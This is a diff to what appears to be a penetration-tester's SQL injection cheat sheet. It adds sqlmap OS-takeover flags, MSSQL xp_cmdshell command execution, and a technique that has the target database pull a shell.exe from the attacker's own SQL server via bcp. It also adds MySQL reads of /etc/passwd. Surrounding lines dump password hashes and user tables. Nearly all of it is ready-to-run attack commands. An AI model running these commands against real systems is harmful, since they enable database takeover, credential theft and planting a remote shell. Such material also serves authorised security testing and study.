@@ -54,8 +54,10 @@ blind3.sh 20 "Select user()" //checks 20 characters of result of custom query se
 SQLMap
 sqlmap -u 'http://sqlmap.com/search.php?search=n' -p search --technique=U -D blogdb -T users -C username,password --dump
 sqlmap -r /root/bloglogin.req -p user --technique=B --banner //uses saved Burpsuite request
+--os-cmd and --os-shell //SQLMap takeover flags
 ```
 ```
+Advanced SQL Server Exploitation
 SELECT name, password FROM master..sysxlogins //MSSQL Server 2000
 SELECT name, password_hash FROM master.sys.sql_logins //For MSSQL Server >=2005
 EXEC master..xp_cmdshell '<command>' //Can be used to run any OS command, need sa privs
@@ -66,6 +68,7 @@ RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 
+Reading the File System
 //Read the result of the dir command by saving output to web accessible folder
 EXEC master..xp_cmdshell 'dir c:\ > C:\inetpub\wwwroot\site\dir.txt'--
 //can browse to dir.txt at the URL, http://site.com/dir.txt
@@ -76,4 +79,19 @@ BULK INSERT filecontent FROM '<target file>';
 /* Remember to drop the table after extracting it:
 DROP TABLE filecontent;
 */
+
+Upload Files
+//Insert file into a table in MS SQL db
+CREATE TABLE HelperTable (file text)
+BULK INSERT HelperTable FROM 'shell.exe' WITH (codepage='RAW')
+//Force target DB server to retrieve file from our SQL server, read exe file from table and recreate it remotely.
+EXEC xp_cmdshell 'bcp "SELECT * FROM HelperTable" queryout shell.exe -c Craw -S<SQL Server Address> -U<Our Server Username> -P<Our Server Password>'
+
+Advanced MySQL Exploitation
+SELECT LOAD_FILE('<text file path>'); //read files by using the load_file function
+//Parse content of a file
+CREATE TABLE temptable(output longtext);
+LOAD DATA INFILE '/etc/passwd' INTO TABLE temptable FIELDS
+TERMINATED BY '\n' (output);
+
 ```
